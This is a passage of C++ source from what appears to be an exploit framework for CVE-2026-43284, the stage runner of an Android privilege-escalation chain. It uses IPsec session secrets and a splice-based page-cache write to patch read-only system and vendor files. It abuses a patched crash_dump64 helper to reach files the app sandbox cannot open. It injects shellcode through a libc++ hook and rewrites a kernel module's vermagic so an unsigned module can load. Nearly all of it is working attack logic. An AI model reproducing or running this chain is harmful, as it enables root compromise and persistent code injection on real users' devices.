             * bound and the write face is a refuse-only stub, so a plan run can
             * not write a byte. */
            steps::ChainOps ops{};
            steps::ChainWorkspace workspace{};
            StageReport report = run_stage(stage, request, ops, workspace);
            if (report.error == StageError::None) {
                std::vector<std::uint8_t> image{};
                StageError image_error = StageError::None;
                if (!read_hook_image(hook_target, steps::kElfMaxImageBytes, image,
                                     image_error)) {
                    report.error = image_error;
                    report.hook.attempted = true;
                    report.hook.target = hook_target;
                    report.hook.symbol = hook_symbol;
                    report.hook.guard = options.hook_guard;
                } else {
                    PlanImageReadContext read_ctx{image.data(), image.size()};
                    steps::HookPatchIo io{};
                    io.ctx = &read_ctx;
                    io.read16 = &plan_image_read16;
                    io.write16 = &plan_write_refused;
                    std::array<std::uint8_t, steps::kShellcodeMaxBytes> shell{};
                    std::array<std::uint8_t, steps::kShellcodeMaxBytes> shell_orig{};
                    StagedHookRequest hook_request{};
                    hook_request.image = image.data();
                    hook_request.image_size = image.size();
                    hook_request.hook_target = hook_target;
                    hook_request.symbol = hook_symbol;
                    hook_request.guard = options.hook_guard;
                    hook_request.carrier_path = carrier_path;
                    hook_request.io = io;
                    hook_request.shellcode_buf = shell.data();
                    hook_request.shellcode_cap = shell.size();
                    hook_request.shellcode_orig_buf = shell_orig.data();
                    if (!plan_staged_hook(hook_request, report.hook)) {
                        report.error = StageError::HookPlanFailed;
                    }
                }
            }
            emit(format_stage_report(report, module_path, carrier_path, plan.module_bytes));
            return stage_exit_code(report);
        }

#if !defined(__linux__)
        StageReport report{};
        report.stage = stage;
        report.dev_target = allow_dev_target;
        report.error = StageError::NotReady;
        emit(format_stage_report(report, module_path, target_path, plan.module_bytes));
        return stage_exit_code(report);
#else
        /* B5-4/B5-9h-3 fail-closed precheck before patch #2: the exact bytes the
         * plan will write must match the required KMI vermagic (ELF/.modinfo
         * name, full vermagic, empty __versions, unsigned). When only the
         * vermagic differs and the explicit rewrite policy is on, the in-memory
         * image is rewritten and re-verified; no module is loaded here. */
        lkm::VermagicOutcome vermagic_outcome = lkm::VermagicOutcome::Unchecked;
        {
            char release_buf[platform::kDeviceReleaseMax] = {};
            char proc_buf[platform::kDeviceProcVersionMax] = {};
            const platform::DeviceProbeOps probe = platform::real_device_probe();
            long release_len = -1;
            if (probe.read_release != nullptr) {
                release_len = probe.read_release(probe.ctx, release_buf,
                                                 sizeof(release_buf));
            }
            long proc_len = -1;
            if (probe.read_proc_version != nullptr) {
                proc_len = probe.read_proc_version(probe.ctx, proc_buf,
                                                   sizeof(proc_buf));
            }
            lkm::DeviceKernelFacts required{};
            required.release =
                    release_len > 0
                            ? std::string_view(release_buf,
                                               static_cast<std::size_t>(release_len))
                            : std::string_view{};
            required.preempt =
                    proc_len > 0 &&
                    lkm::proc_version_has_preempt(std::string_view(
                            proc_buf, static_cast<std::size_t>(proc_len)));
            /* modversions/module_force_unload keep the DeviceKernelFacts
             * audited-target defaults: they are not probeable from userspace
             * and the rewrite stays off by default. */
            lkm::ModuleFacts facts{};
            lkm::LkmImageError lkm_error = lkm::LkmImageError::None;
            if (!reconcile_module_vermagic(plan.bytes.data(),
                                           static_cast<std::size_t>(plan.module_bytes),
                                           required, options.allow_vermagic_rewrite,
                                           facts, vermagic_outcome, lkm_error)) {
                StageReport report{};
                report.stage = stage;
                report.dev_target = allow_dev_target;
                report.error = StageError::ModulePrecheckFailed;
                report.vermagic = vermagic_outcome;
                emit(format_stage_report(report, module_path, target_path,
                                         plan.module_bytes));
                return stage_exit_code(report);
            }
        }

        ScopedIpsecSaParams secrets{};
        const SessionFrameStatus frame =
                read_session_secret_frame(STDIN_FILENO, &secrets.value);
        if (frame != SessionFrameStatus::Ok) {
            StageReport report{};
            report.stage = stage;
            report.dev_target = allow_dev_target;
            report.error = StageError::SessionRejected;
            report.vermagic = vermagic_outcome;
            emit(format_stage_report(report, module_path, target_path, plan.module_bytes));
            return stage_exit_code(report);
        }

        const int target_fd = ::open(carrier_path.c_str(), O_RDONLY | O_CLOEXEC);

        /* Boundary surface: the real target size from fstat(2), asserted against
         * every planned region before a byte is written. A target the App could
         * not open (vendor helper carrier) stays 0 == unknown and relies on the
         * carrier's declared size. */
        std::uint64_t target_size = 0U;
        if (target_fd >= 0) {
            struct stat st{};
            if (::fstat(target_fd, &st) == 0 && st.st_size > 0) {
                target_size = static_cast<std::uint64_t>(st.st_size);
            }
        }
        request.target_size = target_size;

        RealChainContext ctx{};
        /* Delta-2 LKM residency window: owned by this frame, aliased by the
         * chain ops. The staged trigger/full gate therefore exercises the same
         * open/run/close wiring the production composition root binds. */
        LkmWindowRuntime lkm_window{};
        if (plugin_attachment.loaded) {
            lkm_window.attach_registry(&plugin_attachment.registry);
        }
        ctx.lkm_window = &lkm_window;
        ctx.page.sa = secrets.value;
        ctx.page.io = pagecache::real_splice_io();
        ctx.device = platform::real_device_probe();
        ctx.trigger_delay_ms = 500U;
        ctx.target_path = carrier_path.c_str();
        ctx.allow_dev_carrier_path = allow_dev_target;
        ctx.bridge = steps::real_crash_dump_bridge();

        /* Direct fd preferred. A vendor target the App/shell domain cannot open
         * at all (open() failed, so file_fd stays -1) is still reachable: the
         * crash_dump read bridge supplies the old block and the patched helper
         * splices the target page into the write pipe (exp.c patch_file_cbc
         * use_helper=1). The dev-only target cannot use the bridge, and any
         * other open failure stays fatal. */
        const bool helper_carrier =
                target_fd < 0 && !allow_dev_target && ctx.bridge.available() &&
                steps::is_vendor_path(carrier_path);
        if (target_fd < 0 && !helper_carrier) {
            StageReport report{};
            report.stage = stage;
            report.dev_target = allow_dev_target;
            report.error = StageError::InvalidArgument;
            report.vermagic = vermagic_outcome;
            emit(format_stage_report(report, module_path, target_path, plan.module_bytes));
            return stage_exit_code(report);
        }

        ctx.page.file_fd = target_fd;
        ctx.page.socket_fd = connect_esp_socket(secrets.value);
        if (!allow_dev_target) {
            /* patch #1 target: app-readable in the untrusted_app domain. */
            ctx.crash_dump_fd =
                    ::open(patch1_target.c_str(), O_RDONLY | O_CLOEXEC);
        }

        if (ctx.page.socket_fd < 0) {
            if (target_fd >= 0) {
                (void)::close(target_fd);
            }
            StageReport report{};
            report.stage = stage;
            report.dev_target = allow_dev_target;
            report.error = StageError::NotReady;
            report.vermagic = vermagic_outcome;
            emit(format_stage_report(report, module_path, target_path, plan.module_bytes));
            return stage_exit_code(report);
        }

        if (!ctx.run_ready()) {
            real_chain_release(&ctx.page);
            StageReport report{};
            report.stage = stage;
            report.dev_target = allow_dev_target;
            report.error = StageError::NotReady;
            report.vermagic = vermagic_outcome;
            emit(format_stage_report(report, module_path, target_path, plan.module_bytes));
            return stage_exit_code(report);
        }

        /* B5-9h-4: wire the libc++ hook for every non-plan stage. The image and
         * the two shellcode buffers are frame-owned and outlive the chain; the
         * hook target gets its own page-cache write face over the carrier's
         * session socket. */
        std::vector<std::uint8_t> hook_image{};
        std::array<std::uint8_t, steps::kShellcodeMaxBytes> hook_shell{};
        std::array<std::uint8_t, steps::kShellcodeMaxBytes> hook_shell_orig{};
        const int hook_fd = ::open(hook_target.c_str(), O_RDONLY | O_CLOEXEC);
        ctx.hook_path = hook_target.c_str();
        ctx.hook_page.sa = secrets.value;
        ctx.hook_page.io = ctx.page.io;
        ctx.hook_page.file_fd = hook_fd;
        ctx.hook_page.socket_fd = ctx.page.socket_fd;
        if (hook_fd < 0 && !allow_dev_target && ctx.bridge.available()) {
            /* The same helper fallback the vendor carrier uses: the patched
             * crash_dump64 reads the hook target and splices its page when the
             * App cannot open the system file directly. */
            ctx.hook_page.old_page.ctx = &ctx.page;
            ctx.hook_page.old_page.read16 = &real_chain_hook_old_page_read16;
            ctx.hook_page.helper_write.ctx = &ctx.page;
            ctx.hook_page.helper_write.splice16 = &real_chain_hook_helper_splice16;
        }
        const steps::HookPatchIo hook_io = make_real_hook_io(ctx.hook_page);
        const StagedHookAssets hook_assets = prepare_staged_hook(
                ctx, hook_target, hook_symbol, options.hook_guard, hook_image,
                hook_shell.data(), hook_shell.size(), hook_shell_orig.data(),
                hook_io);
        if (hook_assets.status == StagedHookStatus::ImageReadFailed ||
            hook_assets.status == StagedHookStatus::ImageTooLarge) {
            /* The hook target image is required: fail the stage explicitly
             * instead of running a trigger with no hook. */
            real_chain_release(&ctx.page);
            StageReport report{};
            report.stage = stage;
            report.dev_target = allow_dev_target;
            report.error = hook_assets.error;
            report.hook_planned = true;
            report.hook_error = hook_assets.error;
            report.vermagic = vermagic_outcome;
            emit(format_stage_report(report, module_path, target_path,
                                     plan.module_bytes));
            return stage_exit_code(report);
        }

        const steps::ChainOps ops = make_real_chain_ops(ctx);
        steps::ChainWorkspace workspace{};
        StageReport report = run_stage(stage, request, ops, workspace);
        report.hook_planned = true;
        report.hook_armed = hook_assets.status == StagedHookStatus::Armed;
        report.hook_error = hook_assets.error;
        report.vermagic = vermagic_outcome;
        if (!ctx.released) {
            /* A pre-chain rejection left the fds open; close them fail-closed. */
            real_chain_release(&ctx.page);
        }
        if (plugin_attachment.loaded) {
            /* Reuse the existing registry diagnostics channel so a hook failure
             * is visible in the device log. */
            emit(plugin::format_registry_diagnostics(plugin_attachment.registry));
        }
        emit(format_stage_report(report, module_path, target_path, plan.module_bytes));
        return stage_exit_code(report);
#endif
    }
} // namespace ghostlock::backend::cve_2026_43284::stage_runner
